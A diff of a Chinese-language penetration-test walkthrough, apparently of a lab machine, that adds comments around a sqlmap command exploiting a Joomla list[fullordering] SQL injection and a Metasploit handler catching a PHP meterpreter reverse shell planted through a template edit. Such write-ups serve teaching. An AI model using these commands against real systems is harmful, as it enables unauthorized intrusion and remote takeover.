@@ -328,7 +328,9 @@ Parameter: list[fullordering] (GET)
 
 
 
-怎么用 当然是sqlmap啊 还用问 直接用txt里给出的sqlmap语句一把梭
+怎么用 当然是sqlmap啊 还用问 难不成手动一个个去试这个基于时间错误盲注 布尔盲注？
+
+当然是 直接用txt里给出的sqlmap语句一把梭
 
 ```bash
 sqlmap -u "http://<ip there>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
@@ -559,9 +561,11 @@ ok然后在本地启动我的msf
 msfconsole
 use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+#这里设置了一个 有效载荷 所谓payload 是我们刚才在编辑模版这里的 php meterpreter
 msf6 exploit(multi/handler) > set lhost 192.168.31.50
 msf6 exploit(multi/handler) > set lport 4444
 msf6 exploit(multi/handler) > run
+#这里是启动了监听模式
 ```
 
 然后浏览一下index.php就直接可以看到连接上了我的shell
@@ -929,3 +933,8 @@ Have a great day!!!!
 ```
 
 OK.success.
+
+---
+
+---
+
